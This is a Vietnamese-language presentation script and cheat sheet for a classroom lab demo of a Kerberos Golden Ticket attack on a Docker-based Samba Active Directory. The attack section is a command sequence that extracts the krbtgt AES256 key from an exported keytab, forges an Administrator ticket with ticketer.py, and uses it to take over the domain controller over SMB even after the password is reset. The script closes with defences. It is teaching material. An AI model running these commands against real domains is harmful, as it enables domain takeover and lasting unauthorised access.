# KỊCH BẢN THUYẾT TRÌNH & DEMO: KERBEROS GOLDEN TICKET & BYPASS PASSWORD RESET

> **Thời lượng dự kiến:** ~2 - 3 phút  
> **Chủ đề:** Minh họa cơ chế xác thực Kerberos, kỹ thuật tấn công Persistence với Golden Ticket, chứng minh Bypass Password Reset và giải pháp phòng vệ.

---

## 🛠 CHUẨN BỊ TRƯỚC KHI BÁO CÁO (MỞ SẴN 3 TAB TERMINAL)

Để quá trình demo diễn ra trơn tru, hãy mở sẵn **3 tab PowerShell/Terminal** tại máy Host:

* **Tab 1 (Host / DC):** Mở tại thư mục `E:\ATTT\Demo` (dùng để tương tác với Domain Controller).
* **Tab 2 (Client):** Gõ sẵn lệnh:
  ```powershell
  docker compose exec client bash
  ```
* **Tab 3 (Attacker):** Gõ sẵn lệnh:
  ```powershell
  docker compose exec attacker bash
  ```

---

## PHẦN MỞ ĐẦU (15 GIÂY)

* **Thao tác:** Đứng tại slide giới thiệu hoặc màn hình Terminal.
* **Lời thoại:**
  > *"Kính thưa thầy/cô và các bạn, hôm nay nhóm em xin trình bày về cơ chế xác thực Kerberos và kỹ thuật tấn công duy trì quyền truy cập (Persistence) cấp cao nhất: **Golden Ticket**, cùng với đặc tính **Bypass Password Reset**.*  
  > *Hệ thống Lab gồm 3 container Docker: Máy chủ Samba Active Directory DC `dc01.lab.kerb`, máy trạm hợp lệ `client01` của user Alice, và máy tấn công `attacker01`."*

---

## PHẦN 1: DEMO LUỒNG XÁC THỰC KERBEROS HỢP LỆ (30 GIÂY)

* **Thao tác màn hình:** Chuyển sang **Tab 2 (Client)** và chạy tuần tự:
  ```bash
  # 1. Xác thực lấy vé TGT cho Alice
  kinit alice@LAB.KERB
  # Nhập mật khẩu: Alice!2026

  # 2. Xem vé TGT trong bộ nhớ đệm
  klist

  # 3. Truy cập thư mục chia sẻ SMB
  smbclient -L //dc01.lab.kerb -k -N
  ```

* **Lời thoại thuyết minh:**
  > *"Đầu tiên là luồng người dùng bình thường. Alice nhập mật khẩu qua lệnh `kinit`, gửi gói tin `AS-REQ` lên KDC và được cấp vé TGT.  
  > Khi gõ `klist`, chúng ta thấy vé được cấp từ KDC có thời hạn sử dụng chuẩn là **10 giờ**.*  
  > *Sau đó, Alice truy cập vào dịch vụ SMB qua lệnh `smbclient` với tham số `-k`. Hệ thống tự dùng vé Kerberos trong cache để đăng nhập thành công mà **không cần truyền mật khẩu qua mạng** (Cơ chế Single Sign-On)."*

---

## PHẦN 2: TẤN CÔNG GOLDEN TICKET & BYPASS PASSWORD RESET (60 - 75 GIÂY)

### Bước 2.1: Inspect Domain Controller để lấy Domain SID và Khóa AES256
* **Thao tác màn hình:** Chuyển sang **Tab 1 (Host / DC)** và chạy:
  ```powershell
  # 1. Tra cứu Domain SID
  docker compose exec dc wbinfo --name-to-sid Administrator

  # 2. Xuất bảng khóa Keytab của Domain
  docker compose exec dc samba-tool domain exportkeytab /tmp/all.keytab

  # 3. Đọc trực tiếp khóa AES256 256-bit của tài khoản krbtgt
  docker compose exec dc python3 -c "import binascii; f=open('/tmp/all.keytab','rb').read(); p=f.find(b'krbtgt'); print('krbtgt AES256 Key:', binascii.hexlify(f[p+19:p+19+32]).decode())"
  ```

* **Lời thoại thuyết minh:**
  > *"Để rèn vé Golden Ticket, kẻ tấn công sau khi xâm nhập hệ thống cần 2 thông số cốt lõi:*  
  > *1. **Domain SID**: Qua lệnh `wbinfo`, ta thấy SID của Administrator có RID là 500 ở cuối. Cắt bỏ `-500`, ta thu được Domain SID.*  
  > *2. **Khóa AES256 của `krbtgt`**: Em xuất bảng khóa Keytab của DC. Qua script trích xuất, ta thu được chuỗi 32 byte (256-bit) của tài khoản `krbtgt`. Khóa này chính là 'con dấu niêm phong' mà KDC dùng để ký và mã hóa tất cả vé TGT."*

---

### Bước 2.2: Rèn vé giả mạo, nạp vé và đột nhập chiếm quyền DC
* **Thao tác màn hình:** Chuyển sang **Tab 3 (Attacker)** và chạy:
  ```bash
  # 1. Rèn vé Golden Ticket Offline
  ticketer.py \
    -aesKey 251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700 \
    -domain-sid S-1-5-21-3517008435-4032162519-3515808235 \
    -domain LAB.KERB \
    -user-id 500 \
    Administrator

  # 2. Nạp vé vào biến môi trường
  export KRB5CCNAME=/Administrator.ccache

  # 3. Kiểm tra thông tin vé
  klist

  # 4. Đột nhập vào DC chiếm quyền SMB
  smbclient.py -k -no-pass 'LAB.KERB/Administrator@dc01.lab.kerb'
  ```
  *(Khi vào trong SMB shell, gõ `shares`, sau đó gõ `exit` để thoát)*

* **Lời thoại thuyết minh:**
  > *"Trên máy Attacker, em dùng công cụ `ticketer.py` để rèn vé. Thao tác này diễn ra **100% offline**, không hề gửi bất kỳ gói tin nào lên mạng.*  
  > *Khi nạp vé và kiểm tra bằng `klist`, thầy cô có thể thấy hai điểm bất thường chí mạng:*  
  > * *Vé tự mạo danh tài khoản tối cao **Administrator** (RID 500).*  
  > * *Thời hạn sử dụng của vé kéo dài tới **10 năm** (đến tận năm 2036), thay vì chỉ 10 giờ như vé chuẩn.*  
  > *Tiếp theo, Attacker dùng `smbclient.py` với cờ `-k -no-pass`. Do vé được ký đúng bằng khóa của `krbtgt`, KDC tin tưởng tuyệt đối và cấp toàn quyền điều khiển DC cho Attacker mà không cần mật khẩu!"*

---

### Bước 2.3: Đổi mật khẩu Administrator và chứng minh Bypass Password Reset
* **Thao tác màn hình 1:** Chuyển sang **Tab 1 (Host / DC)**:
  ```powershell
  # Quản trị viên đổi mật khẩu tài khoản Administrator
  docker compose exec dc samba-tool user setpassword Administrator --newpassword='MatKhauMoi!2026'
  ```
* **Lời thoại:**
  > *"Bây giờ, giả sử Quản trị viên phát hiện sự cố và lập tức **đổi mật khẩu tài khoản Administrator** thành `MatKhauMoi!2026`."*

* **Thao tác màn hình 2:** Chuyển nhanh sang **Tab 3 (Attacker)**:
  ```bash
  # Attacker tiếp tục dùng vé Golden Ticket cũ truy cập lại
  smbclient.py -k -no-pass 'LAB.KERB/Administrator@dc01.lab.kerb'
  ```
  *(Khi vào trong SMB shell, gõ `shares`, sau đó gõ `exit`)*

* **Lời thoại thuyết minh (Điểm chốt):**
  > *"Kỳ diệu là trên máy Attacker, khi em chạy lại lệnh truy cập bằng chiếc vé cũ, **hệ thống vẫn cho phép vào thẳng shell quản trị bình thường!**  
  > 👉 Điều này chứng minh: **Golden Ticket hoàn toàn độc lập với mật khẩu của nạn nhân**. Hành động đổi mật khẩu/reset mật khẩu tài khoản người dùng đã bị **Bypass** hoàn toàn!"*

---

## PHẦN 3: GIẢI PHÁP PHÒNG VỆ & KHẮC PHỤC SỰ CỐ (30 GIÂY)

* **Thao tác:** Chiếu slide giải pháp phòng vệ hoặc đứng tại màn hình tóm tắt.
* **Lời thoại thuyết minh:**
  > *"Thưa thầy/cô, để phát hiện và ngăn chặn cuộc tấn công nguy hiểm này, chúng ta cần triển khai các giải pháp:*  
  > 1. **Biện pháp khắc phục triệt để sự cố**: Đổi mật khẩu Administrator không có tác dụng. Bắt buộc phải **Reset mật khẩu của chính tài khoản `krbtgt` 2 lần liên tiếp** (để xóa cả mật khẩu hiện tại và mật khẩu lịch sử trong Active Directory). Khi khóa `krbtgt` thay đổi, mọi vé Golden Ticket đang lưu hành sẽ lập tức bị vô hiệu hóa.  
  > 2. **Giám sát nhật ký (SIEM / SOC)**:  
  >    * Cảnh báo các vé có thời hạn bất thường (Ticket Lifetime vượt quá chính sách Domain, ví dụ vé 10 năm).  
  >    * Bắt chuỗi sự kiện bất thường: Xuất hiện Event ID **4769** (Yêu cầu cấp vé dịch vụ TGS) mà **không hề có** Event ID **4768** (Yêu cầu cấp TGT ban đầu từ AS) tương ứng trước đó.  
  > 3. **Phòng ngừa kiến trúc**: Áp dụng mô hình phân tầng AD Tiering Model (Tier 0), không bao giờ để tài khoản quản trị Domain đăng nhập vào các máy trạm thông thường nhằm tránh bị lộ mã hash/khóa.*  
  > *Phần thuyết trình và demo của nhóm em đến đây là kết thúc. Em xin cảm ơn thầy cô đã theo dõi!"*

---

## BẢNG TỔNG HỢP CÂU LỆNH NHANH (CHEATSHEET)

| Tab | Mục đích | Câu lệnh |
| :--- | :--- | :--- |
| **Tab 2 (Client)** | Luồng hợp lệ | `kinit alice@LAB.KERB`<br>`klist`<br>`smbclient -L //dc01.lab.kerb -k -N` |
| **Tab 1 (Host/DC)** | Lấy Domain SID | `docker compose exec dc wbinfo --name-to-sid Administrator` |
| **Tab 1 (Host/DC)** | Lấy AES256 Key | `docker compose exec dc samba-tool domain exportkeytab /tmp/all.keytab`<br>`docker compose exec dc python3 -c "import binascii; f=open('/tmp/all.keytab','rb').read(); p=f.find(b'krbtgt'); print('krbtgt AES256 Key:', binascii.hexlify(f[p+19:p+19+32]).decode())"` |
| **Tab 3 (Attacker)** | Rèn & Nạp vé | `ticketer.py -aesKey 251c34132ea70a1a25022cdf1a3ad73dfd7b5ee2f926431103c1c57afa744700 -domain-sid S-1-5-21-3517008435-4032162519-3515808235 -domain LAB.KERB -user-id 500 Administrator`<br>`export KRB5CCNAME=/Administrator.ccache`<br>`klist` |
| **Tab 3 (Attacker)** | Đột nhập SMB | `smbclient.py -k -no-pass 'LAB.KERB/Administrator@dc01.lab.kerb'` |
| **Tab 1 (Host/DC)** | Đổi pass Admin | `docker compose exec dc samba-tool user setpassword Administrator --newpassword='MatKhauMoi!2026'` |
| **Tab 3 (Attacker)** | Kiểm tra Bypass | `smbclient.py -k -no-pass 'LAB.KERB/Administrator@dc01.lab.kerb'` |

